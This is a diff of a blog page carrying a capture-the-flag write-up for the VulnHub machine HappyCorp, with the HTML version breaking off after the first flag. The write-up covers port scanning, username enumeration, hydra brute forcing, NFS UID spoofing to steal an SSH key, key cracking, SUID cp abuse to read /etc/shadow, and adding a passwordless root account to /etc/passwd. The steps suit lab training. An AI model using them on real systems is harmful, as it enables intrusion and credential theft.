@@ -1,77 +1,239 @@
 <!DOCTYPE html>
-<html>
-<head>
-	<meta charset="utf-8" />
-	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>VulnHub: HappyCorp - ben-dale.co.uk</title><meta name="viewport" content="width=device-width, initial-scale=1">
+<html lang="en" dir="auto">
 
-	<meta property="og:title" content="VulnHub: HappyCorp" />
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>VulnHub: HappyCorp | PaperMod</title>
+<meta name="keywords" content="" />
+<meta name="description" content="My write-up for HappyCorp, a VulnHub box created by Zayotic.">
+<meta name="author" content="Theme PaperMod">
+<link rel="canonical" href="/posts/vulnhub-happycorp/" />
+<link crossorigin="anonymous" href="/assets/css/stylesheet.min.d0c0348c2d0cff14148d0e347258519d8df2ce53ce5ac32c7bd9a549182cb8ae.css" integrity="sha256-0MA0jC0M/xQUjQ40clhRnY3yzlPOWsMse9mlSRgsuK4=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.min.27cd435cc9ed6abb4b496581b151804f79f366c412620272bb94e2f5f598ebcc.js" integrity="sha256-J81DXMntartLSWWBsVGAT3nzZsQSYgJyu5Ti9fWY68w="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+<link rel="mask-icon" href="/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<meta name="generator" content="Hugo 0.80.0" />
+<link rel="alternate" hreflang="en" href="/posts/vulnhub-happycorp/" />
+<meta property="og:title" content="VulnHub: HappyCorp" />
 <meta property="og:description" content="My write-up for HappyCorp, a VulnHub box created by Zayotic." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="/posts/vulnhub-happycorp/" />
-<meta property="article:published_time" content="2020-03-09T00:00:00+00:00" />
-<meta property="article:modified_time" content="2020-03-09T00:00:00+00:00" />
-<meta name="twitter:card" content="summary"/>
+<meta property="og:url" content="/posts/vulnhub-happycorp/" /><meta property="og:image" content="/papermod-cover.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-03-09T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2020-03-09T00:00:00&#43;00:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/papermod-cover.png"/>
+
 <meta name="twitter:title" content="VulnHub: HappyCorp"/>
 <meta name="twitter:description" content="My write-up for HappyCorp, a VulnHub box created by Zayotic."/>
-<link rel="stylesheet" type="text/css" media="screen" href="/css/normalize.css" />
-	<link rel="stylesheet" type="text/css" media="screen" href="/css/main.css" />
-	<link rel="stylesheet" type="text/css" media="screen" href="/css/all.css" />
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "/posts/"
+    }
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "VulnHub: HappyCorp",
+      "item": "/posts/vulnhub-happycorp/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "VulnHub: HappyCorp",
+  "name": "VulnHub: HappyCorp",
+  "description": "My write-up for HappyCorp, a VulnHub box created by Zayotic.",
+  "keywords": [
+    
+  ],
+  "articleBody": "Here’s my write-up for HappyCorp, a VulnHub box created by Zayotic.\nWrite-up The description for this box states the following:\n+- - - - - - - - - - - - - -|- - - - - - - - - - - - - - -+ | Name: Happycorp | IP: DHCP | | Date: 2019-March-05 | Goal: Get Root! | | Author: Zayotic | Difficultly: ??? | +- - - - - - - - - - - - - -|- - - - - - - - - - - - - - -+ | | | + Average beginner/intermediate VM, only a few twists | | + May find it easy/hard (depends on YOUR background) | | + ...also which way you attack the box | | | | + It SHOULD work on VMware | | + REBOOT the VM if you CHANGE network modes | | + Fusion users, you'll need to retry when importing | | | | | +- - - - - - - - - - - - - - - - - - - - - - - - - - - - -+ | | | --[[~~Enjoy. Have fun. Happy Hacking.~~]]-- | | | +---------------------------------------------------------+ Once I had the VM setup and running I found out the IP of the box (using arp-scan) and ran nmap to see what services were running:\nkali@kali:~/Documents/vulnhub/happycorp1$ nmap -sC -sV -oA ports 192.168.1.189 Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-09 09:55 EDT Nmap scan report for happycorp (192.168.1.189) Host is up (0.00024s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 81:ea:90:61:be:0a:f2:8d:c3:4e:41:03:f0:07:8b:93 (RSA) | 256 f6:07:4a:7e:1d:d8:cf:a7:cc:fd:fb:b3:18:ce:b3:af (ECDSA) |_ 256 64:9a:52:7b:75:b7:92:0d:4b:78:71:26:65:37:6c:bd (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-robots.txt: 1 disallowed entry |_/admin.php |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Happycorp 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100003 3,4 2049/tcp nfs | 100003 3,4 2049/tcp6 nfs | 100003 3,4 2049/udp nfs | 100003 3,4 2049/udp6 nfs | 100005 1,2,3 41864/udp6 mountd | 100005 1,2,3 50515/tcp6 mountd | 100005 1,2,3 55840/udp mountd | 100005 1,2,3 58915/tcp mountd | 100021 1,3,4 32975/udp6 nlockmgr | 100021 1,3,4 44287/tcp nlockmgr | 100021 1,3,4 44423/tcp6 nlockmgr | 100021 1,3,4 58961/udp nlockmgr | 100227 3 2049/tcp nfs_acl | 100227 3 2049/tcp6 nfs_acl | 100227 3 2049/udp nfs_acl |_ 100227 3 2049/udp6 nfs_acl 2049/tcp open nfs_acl 3 (RPC #100227) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel The first thing I took a look at was the http server running on port 80:\n“We’re in the business of helping spread happiness worldwide”. Cute 🤗.\nScrolling down the page a bit I came across some interesting information:\nHeather Eillis - heather@happycorp.local Carolyn Vargas - carolyn@happycorp.local Rodney Douglas - rodney@happycorp.local Jennifer Richardson - jennifer@happycorp.local I noted down these names and e-mail addresses. I also added happycorp.local to my /etc/hosts incase anything was using happycorp.local to resolve something.\nI also came across a contact form but this didn’t look to be hooked up:\nWhilst I was clicking around I had nikto and dirb running in the background. Once I had finished looking around I took a look at what dirb and nikto had found.\nkali@kali:~/Documents/vulnhub/happycorp1$ nikto -host http://happycorp.local - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 192.168.1.189 + Target Hostname: happycorp.local + Target Port: 80 + Start Time: 2020-03-09 10:00:44 (GMT-4) --------------------------------------------------------------------------- + Server: Apache/2.4.25 (Debian) ... + OSVDB-3092: /admin.php: This might be interesting... ... kali@kali:~$ dirb http://happycorp.local -X .php,.html ----------------- DIRB v2.22 By The Dark Raver ----------------- ... + http://happycorp.local/admin.php (CODE:200|SIZE:469) + http://happycorp.local/blog.html (CODE:200|SIZE:22163) + http://happycorp.local/cms.php (CODE:302|SIZE:337) + http://happycorp.local/index.html (CODE:200|SIZE:34853) Both nikto and dirb found admin.php, and dirb also found cms.php but I imagined (given the 302) that you needed a session to view this page.\nI took a look at the page source and found a helpful bit of information left by Rodney:\nI went with the presumption that the admin credentials were hardcoded in admin.php. I tried the usual admin:admin, waited a few seconds (which I thought was odd, it shouldn’t be this slow, especially given the comment) and was greeted with an interesting error message:\nDid this mean that I could enumerate usernames? I tried some of the names I captured before (heather, carolyn, rodney and jennifer). Attemping to log in with “heather” returned a different error message this time:\nAfter trying several passwords I set up hydra to brute force this login form. I gave it a couple of minutes, leaving hydra to do its thing, and given that I was now at a dead-end, I moved onto NFS running on port 2049.\nRunning showmount returned the NFS server’s export list, which only contained one thing:\nkali@kali:~$ sudo showmount -e 192.168.1.189 Export list for 192.168.1.189: /home/karl * This exposes user karl. I created an empty folder and mounted the share:\nkali@kali:~$ mkdir /tmp/NFS kali@kali:~$ sudo mount 192.168.1.189:/ /tmp/NFS kali@kali:~$ cd /tmp/NFS/home/karl kali@kali:/tmp/NFS/home/karl$ ls -al total 28 drwxr-xr-x 3 1001 1001 4096 Mar 5 2019 . drwxr-xr-x 3 root root 4096 Mar 4 2019 .. lrwxrwxrwx 1 root root 9 Mar 5 2019 .bash_history - /dev/null -rw-r--r-- 1 1001 1001 220 Mar 4 2019 .bash_logout -rw-r--r-- 1 1001 1001 3538 Mar 5 2019 .bashrc -rw------- 1 1001 1001 28 Mar 4 2019 .lesshst -rw-r--r-- 1 1001 1001 675 Mar 4 2019 .profile drwx------ 2 1001 1001 4096 Mar 5 2019 .ssh I tried to cd into .ssh and got a permissions error, which made sense in my head… and then a few seconds later it didn’t make sense. Given my rudimentary knowledge of NFS I wondered how NFS enforces file permissions when you mount a share on a different machine, with a different set of users. Could this be messed with somehow? I did some research and came across this article which backed up my thinking:\n If there are any files on the exported share that the user doesn’t have permission to read them then it might be possible to trick the NFS server to believe that the user account that tries to read the file is the owner of the file. This can be achieved by performing UID (User ID) manipulation.\n I created a user on my machine named “karl” with the UID of 1001 and switched to karl:\nkali@kali:/tmp/NFS/home/karl$ su karl $ ls -al total 28 drwxr-xr-x 3 karl karl 4096 Mar 5 2019 . drwxr-xr-x 3 root root 4096 Mar 4 2019 .. lrwxrwxrwx 1 root root 9 Mar 5 2019 .bash_history - /dev/null -rw-r--r-- 1 karl karl 220 Mar 4 2019 .bash_logout -rw-r--r-- 1 karl karl 3538 Mar 5 2019 .bashrc -rw------- 1 karl karl 28 Mar 4 2019 .lesshst -rw-r--r-- 1 karl karl 675 Mar 4 2019 .profile drwx------ 2 karl karl 4096 Mar 5 2019 .ssh The 1001’s had changed to karl’s. I tried to cd into .ssh again and it worked!\n$ cd .ssh $ ls -al total 24 drwx------ 2 karl karl 4096 Mar 5 2019 . drwxr-xr-x 3 karl karl 4096 Mar 5 2019 .. -rw-r--r-- 1 karl karl 740 Mar 4 2019 authorized_keys -rw------- 1 karl karl 3326 Mar 4 2019 id_rsa -rw-r--r-- 1 karl karl 740 Mar 4 2019 id_rsa.pub -rw-r--r-- 1 karl karl 18 Mar 4 2019 user.txt This is also how I found the first flag:\n$ cat user.txt flag1{Z29vZGJveQ} I planned to create another ssh keypair that I controlled and to add the public key to the authorized_keys file in karl’s home directory, but I only had read permissions for the entire share. The next plan was to make a copy of the private key (id_rsa) and use that to ssh in as karl.\n# As karl $ cp id_rsa /home/kali/Documents/vulnhub/happycorp1 # Back to kali user kali@kali:~/Documents/vulnhub/happycorp1$ ssh karl@192.168.1.189 -i id_rsa Enter passphrase for key 'id_rsa': The private key was protected by a password. Cracking this with john thankfully didn’t take too long. I used ssh2john.py to hash the private key and used the rockyou wordlist to crack the password:\nkali@kali:~/Documents/vulnhub/happycorp1$ /usr/share/john/ssh2john.py id_rsa id_rsa.hash I ssh’d in as karl and had to wait a few seconds whilst some weird error messages appeared:\nAfter searching around for some explanation I came to a conclusion that either rbash or bash (or something) was stuck in a loop. I couldn’t exit but after some keyboard smashing (lots of Ctrl+C and exits) I got into a working rbash shell. I couldn’t cd around but that didn’t stop me from looking at files using their full path. I wanted to take a look at admin.php to confirm my earlier presumptions about the hardcoded password (plus hydra still hadn’t found the password):\nThe slowness that I experienced when I was trying to log into the admin page now made sense given the sleep(3). The password also was hardcoded as suggested by Rodney’s comment.\nI logged in to the admin page using the now retrieved credentials but I didn’t find much, just a few passive-aggressive remarks by Rodney in a barely functional CMS:\ncms.php: home.php: backup.php: This avenue didn’t lead anywhere so I shifted my attention back to the access I had to karl’s account. I downloaded a copy of LinEnum to karl’s home directory but rbash didn’t let me run it. I backed out and ssh’d in again, this time using -t to force a shell.\nkali@kali:~/Documents/vulnhub/happycorp1$ ssh karl@192.168.1.189 -i id_rsa -t /bin/sh This worked and I now had a basic unrestricted shell to mess around with. I ran LinEnum which found that cp had a SUID bit set:\nI verified this by making a copy of /etc/shadow and viewing it:\nI couldn’t get access to root’s home directory, but given the location of the user flag I assumed the root flag would be somewhere similar, with the name “root.txt”:\nAlthough I had the flag I still didn’t have full root-level access, so to finish the job I made a copy of /etc/passwd and added the following line:\nhacker::0:0:root:/root:/bin/bash I had to copy the copy of /etc/passwd to my local machine (using python -m http.server) so that I could edit it. This was because cp has the SUID bit set and the copy of /etc/passwd has read-only root privilege so I couldn’t edit it on the box. Once I made the edit I used the same method to copy the edited /etc/passwd file back to HappyCorp (python -m http.server from my machine and wget from the HappyCorp box) and overwrote the passwd file under /etc:\n$ cp passwd /etc/passwd Final thoughts I enjoyed HappyCorp a lot. I was left scratching my head a couple of times but with the right amount of research, I managed to get to the root flag. Thanks for the challenge Zayotic!\n",
+  "wordCount" : "1805",
+  "inLanguage": "en",
+  "datePublished": "2020-03-09T00:00:00Z",
+  "dateModified": "2020-03-09T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Theme PaperMod"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "/posts/vulnhub-happycorp/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "PaperMod",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "/favicon.ico"
+    }
+  }
+}
+</script>
 </head>
 
-<body>
-	<div class="container wrapper">
-		<div class="header">
-	
-		<div class="avatar">
-			<a href="/">
-				<img src="/static/img/logo.png" alt="ben-dale.co.uk" />
-			</a>
-		</div>
-	
-	<h1 class="site-title"><a href="/">ben-dale.co.uk</a></h1>
-	<div class="site-description"><p>some guy that does some stuff</p><nav class="nav social">
-			<ul class="flat"><li class="li-social"><a href="https://github.com/ben-dale"><i title="Github" class="icons fab fa-github"></i></a></li><li class="li-social"><a href="https://twitter.com/mrbenjamind"><i title="Twitter" class="icons fab fa-twitter"></i></a></li><li class="li-social"><a href="https://keybase.io/mrbenjamind"><i title="Keybase" class="icons fab fa-keybase"></i></a></li></ul>
-		</nav>
-	</div>
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
 
-	<nav class="nav">
-		<ul class="flat">
-			
-			<li>
-				<a href="/">Home</a>
-			</li>
-			
-			<li>
-				<a href="/posts">All posts</a>
-			</li>
-			
-		</ul>
-	</nav>
+</script>
+<noscript>
+    <style type="text/css">
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: #1d1e20;
+                --entry: #2e2e33;
+                --primary: rgba(255, 255, 255, 0.84);
+                --secondary: rgba(255, 255, 255, 0.56);
+                --tertiary: rgba(255, 255, 255, 0.16);
+                --content: rgba(255, 255, 255, 0.74);
+                --hljs-bg: #2e2e33;
+                --code-bg: #37383e;
+                --border: #333;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="/" accesskey="h" title="PaperMod (Alt + H)">PaperMod</a>
+            <span class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+                <ul class="lang-switch"><li>|</li>
+                    <li>
+                        <a href="/fr/" title="French"
+                            aria-label=":fr:">🇫🇷</a>
+                    </li>
+                    <li>
+                        <a href="/fa/" title="Fa"
+                            aria-label="Fa">Fa</a>
+                    </li>
+                </ul>
+            </span>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/archives" title="Archive">
+                    <span>Archive</span>
+                </a>
+            </li>
+            <li>
+                <a href="/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="/search/" title="Search">
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="/">Home</a>&nbsp;»&nbsp;<a href="/posts/">Posts</a></div>
+    <h1 class="post-title">
+      VulnHub: HappyCorp
+    </h1>
+    <div class="post-description">
+      My write-up for HappyCorp, a VulnHub box created by Zayotic.
+    </div>
+    <div class="post-meta">March 9, 2020&nbsp;·&nbsp;9 min&nbsp;·&nbsp;Theme PaperMod&nbsp;|&nbsp;<a href="https://github.com/adityatelange/hugo-PaperMod/tree/exampleSite/content/posts/vulnhub-happycorp.md" rel="noopener noreferrer" target="_blank">Suggest Changes</a>
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <div class="details">Table of Contents</div>
+        </summary>
+        <div class="inner"><ul>
+                <li>
+                    <a href="#write-up" aria-label="Write-up">Write-up</a></li>
+                <li>
+                    <a href="#final-thoughts" aria-label="Final thoughts">Final thoughts</a>
+                </li>
+            </ul>
+        </div>
+    </details>
 </div>
 
-
-		<div class="post">
-			<div class="author">
-				
-			</div>
-			<div class="post-header">
-				
-					<div class="meta">
-						<div class="date">
-							<span class="day">09</span>
-							<span class="rest">Mar 2020</span>
-						</div>
-					</div>
-				
-				<div class="matter">
-					<h1 class="title">VulnHub: HappyCorp</h1>
-				</div>
-			</div>
-			<div class="markdown">
-				<p>Here&rsquo;s my write-up for <a href="https://www.vulnhub.com/entry/happycorp-1,296/">HappyCorp</a>, a VulnHub box created by <a href="https://twitter.com/Zayotic">Zayotic</a>.</p>
-<h3 id="write-up">Write-up</h3>
+  <div class="post-content"><p>Here&rsquo;s my write-up for <a href="https://www.vulnhub.com/entry/happycorp-1,296/">HappyCorp</a>, a VulnHub box created by <a href="https://twitter.com/Zayotic">Zayotic</a>.</p>
+<h3 id="write-up">Write-up<a hidden class="anchor" aria-hidden="true" href="#write-up">#</a></h3>
 <p>The description for this box states the following:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">+- - - - - - - - - - - - - -|- - - - - - - - - - - - - - -+
+<pre><code>+- - - - - - - - - - - - - -|- - - - - - - - - - - - - - -+
 |   Name: Happycorp         |          IP: DHCP           |
 |   Date: 2019-March-05     |        Goal: Get Root!      |
 | Author: Zayotic           | Difficultly: ???            |
@@ -83,7 +245,7 @@
 |                                                         |
 | + It SHOULD work on VMware                              |
 |   + REBOOT the VM if you CHANGE network modes           |
-|   + Fusion users, you&#39;ll need to retry when importing   |
+|   + Fusion users, you'll need to retry when importing   |
 |                                                         |
 |                                                         |
 +- - - - - - - - - - - - - - - - - - - - - - - - - - - - -+
@@ -91,8 +253,8 @@
 |       --[[~~Enjoy. Have fun. Happy Hacking.~~]]--       |
 |                                                         |
 +---------------------------------------------------------+
-</code></pre></div><p>Once I had the VM setup and running I found out the IP of the box (using <code>arp-scan</code>) and ran <code>nmap</code> to see what services were running:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/Documents/vulnhub/happycorp1$ nmap -sC -sV -oA ports 192.168.1.189
+</code></pre><p>Once I had the VM setup and running I found out the IP of the box (using <code>arp-scan</code>) and ran <code>nmap</code> to see what services were running:</p>
+<pre><code>kali@kali:~/Documents/vulnhub/happycorp1$ nmap -sC -sV -oA ports 192.168.1.189
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-09 09:55 EDT
 Nmap scan report for happycorp (192.168.1.189)
 Host is up (0.00024s latency).
@@ -133,20 +295,23 @@ PORT     STATE SERVICE VERSION
 |_  100227  3           2049/udp6  nfs_acl                                                                                                                                                                                                
 2049/tcp open  nfs_acl 3 (RPC #100227)                                                                                                                                                                                                    
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre></div><p>The first thing I took a look at was the http server running on port 80:</p>
-<p><img src="/static/happycorp/1.png" alt=""></p>
+</code></pre><p>The first thing I took a look at was the http server running on port 80:</p>
+<p><img loading="lazy" src="/static/happycorp/1.png" alt=""  />
+</p>
 <p>&ldquo;We&rsquo;re in the business of helping spread happiness worldwide&rdquo;. Cute 🤗.</p>
 <p>Scrolling down the page a bit I came across some interesting information:</p>
-<p><img src="/static/happycorp/2.png" alt=""></p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Heather Eillis - heather@happycorp.local
+<p><img loading="lazy" src="/static/happycorp/2.png" alt=""  />
+</p>
+<pre><code>Heather Eillis - heather@happycorp.local
 Carolyn Vargas - carolyn@happycorp.local
 Rodney Douglas - rodney@happycorp.local
 Jennifer Richardson - jennifer@happycorp.local
-</code></pre></div><p>I noted down these names and e-mail addresses. I also added <code>happycorp.local</code> to my <code>/etc/hosts</code> incase anything was using <code>happycorp.local</code> to resolve something.</p>
+</code></pre><p>I noted down these names and e-mail addresses. I also added <code>happycorp.local</code> to my <code>/etc/hosts</code> incase anything was using <code>happycorp.local</code> to resolve something.</p>
 <p>I also came across a contact form but this didn&rsquo;t look to be hooked up:</p>
-<p><img src="/static/happycorp/3.png" alt=""></p>
+<p><img loading="lazy" src="/static/happycorp/3.png" alt=""  />
+</p>
 <p>Whilst I was clicking around I had <code>nikto</code> and <code>dirb</code> running in the background. Once I had finished looking around I took a look at what <code>dirb</code> and <code>nikto</code> had found.</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~/Documents/vulnhub/happycorp1$ nikto -host http://happycorp.local
+<pre><code>kali@kali:~/Documents/vulnhub/happycorp1$ nikto -host http://happycorp.local
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
 + Target IP:          192.168.1.189
@@ -169,21 +334,25 @@ By The Dark Raver
 + http://happycorp.local/blog.html (CODE:200|SIZE:22163)
 + http://happycorp.local/cms.php (CODE:302|SIZE:337)
 + http://happycorp.local/index.html (CODE:200|SIZE:34853)                        
-</code></pre></div><p>Both <code>nikto</code> and <code>dirb</code> found <code>admin.php</code>, and <code>dirb</code> also found <code>cms.php</code> but I imagined (given the 302) that you needed a session to view this page.</p>
-<p><img src="/static/happycorp/4.png" alt=""></p>
+</code></pre><p>Both <code>nikto</code> and <code>dirb</code> found <code>admin.php</code>, and <code>dirb</code> also found <code>cms.php</code> but I imagined (given the 302) that you needed a session to view this page.</p>
+<p><img loading="lazy" src="/static/happycorp/4.png" alt=""  />
+</p>
 <p>I took a look at the page source and found a helpful bit of information left by Rodney:</p>
-<p><img src="/static/happycorp/6.png" alt=""></p>
+<p><img loading="lazy" src="/static/happycorp/6.png" alt=""  />
+</p>
 <p>I went with the presumption that the admin credentials were hardcoded in <code>admin.php</code>. I tried the usual <code>admin:admin</code>, waited a few seconds (which I thought was odd, it shouldn&rsquo;t be this slow, especially given the comment) and was greeted with an interesting error message:</p>
-<p><img src="/static/happycorp/5.png" alt=""></p>
+<p><img loading="lazy" src="/static/happycorp/5.png" alt=""  />
+</p>
 <p>Did this mean that I could enumerate usernames? I tried some of the names I captured before (heather, carolyn, rodney and jennifer). Attemping to log in with &ldquo;heather&rdquo; returned a different error message this time:</p>
-<p><img src="/static/happycorp/7.png" alt=""></p>
+<p><img loading="lazy" src="/static/happycorp/7.png" alt=""  />
+</p>
 <p>After trying several passwords I set up <code>hydra</code> to brute force this login form. I gave it a couple of minutes, leaving <code>hydra</code> to do its thing, and given that I was now at a dead-end, I moved onto NFS running on port 2049.</p>
 <p>Running <code>showmount</code> returned the NFS server&rsquo;s export list, which only contained one thing:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~$ sudo showmount -e 192.168.1.189
+<pre><code>kali@kali:~$ sudo showmount -e 192.168.1.189
 Export list for 192.168.1.189:
 /home/karl *
-</code></pre></div><p>This exposes user <code>karl</code>. I created an empty folder and mounted the share:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:~$ mkdir /tmp/NFS
+</code></pre><p>This exposes user <code>karl</code>. I created an empty folder and mounted the share:</p>
+<pre><code>kali@kali:~$ mkdir /tmp/NFS
 kali@kali:~$ sudo mount 192.168.1.189:/ /tmp/NFS
 kali@kali:~$ cd /tmp/NFS/home/karl
 kali@kali:/tmp/NFS/home/karl$ ls -al
@@ -196,12 +365,12 @@ lrwxrwxrwx 1 root root    9 Mar  5  2019 .bash_history -&gt; /dev/null
 -rw------- 1 1001 1001   28 Mar  4  2019 .lesshst
 -rw-r--r-- 1 1001 1001  675 Mar  4  2019 .profile
 drwx------ 2 1001 1001 4096 Mar  5  2019 .ssh
-</code></pre></div><p>I tried to <code>cd</code> into <code>.ssh</code> and got a permissions error, which made sense in my head&hellip; and then a few seconds later it didn&rsquo;t make sense. Given my rudimentary knowledge of NFS I wondered how NFS enforces file permissions when you mount a share on a different machine, with a different set of users. Could this be messed with somehow? I did some research and came across <a href="https://pentestacademy.wordpress.com/2017/09/20/nfs/">this article</a> which backed up my thinking:</p>
+</code></pre><p>I tried to <code>cd</code> into <code>.ssh</code> and got a permissions error, which made sense in my head&hellip; and then a few seconds later it didn&rsquo;t make sense. Given my rudimentary knowledge of NFS I wondered how NFS enforces file permissions when you mount a share on a different machine, with a different set of users. Could this be messed with somehow? I did some research and came across <a href="https://pentestacademy.wordpress.com/2017/09/20/nfs/">this article</a> which backed up my thinking:</p>
 <blockquote>
 <p>If there are any files on the exported share that the user doesn’t have permission to read them then it might be possible to trick the NFS server to believe that the user account that tries to read the file is the owner of the file. This can be achieved by performing UID (User ID) manipulation.</p>
 </blockquote>
 <p>I created a user on my machine named &ldquo;karl&rdquo; with the UID of 1001 and switched to <code>karl</code>:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">kali@kali:/tmp/NFS/home/karl$ su karl
+<pre><code>kali@kali:/tmp/NFS/home/karl$ su karl
 $ ls -al
 total 28
 drwxr-xr-x 3 karl karl 4096 Mar  5  2019 .
@@ -212,8 +381,8 @@ lrwxrwxrwx 1 root root    9 Mar  5  2019 .bash_history -&gt; /dev/null
 -rw------- 1 karl karl   28 Mar  4  2019 .lesshst
 -rw-r--r-- 1 karl karl  675 Mar  4  2019 .profile
 drwx------ 2 karl karl 4096 Mar  5  2019 .ssh
-</code></pre></div><p>The <code>1001</code>&rsquo;s had changed to <code>karl</code>&rsquo;s. I tried to <code>cd</code> into <code>.ssh</code> again and it worked!</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ cd .ssh
+</code></pre><p>The <code>1001</code>&rsquo;s had changed to <code>karl</code>&rsquo;s. I tried to <code>cd</code> into <code>.ssh</code> again and it worked!</p>
+<pre><code>$ cd .ssh
 $ ls -al
 total 24
 drwx------ 2 karl karl 4096 Mar  5  2019 .
@@ -222,67 +391,234 @@ drwxr-xr-x 3 karl karl 4096 Mar  5  2019 ..
 -rw------- 1 karl karl 3326 Mar  4  2019 id_rsa
 -rw-r--r-- 1 karl karl  740 Mar  4  2019 id_rsa.pub
 -rw-r--r-- 1 karl karl   18 Mar  4  2019 user.txt
-</code></pre></div><p>This is also how I found the first flag:</p>
-<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ cat user.txt
+</code></pre><p>This is also how I found the first flag:</p>
+<pre><code>$ cat user.txt
 flag1{Z29vZGJveQ}
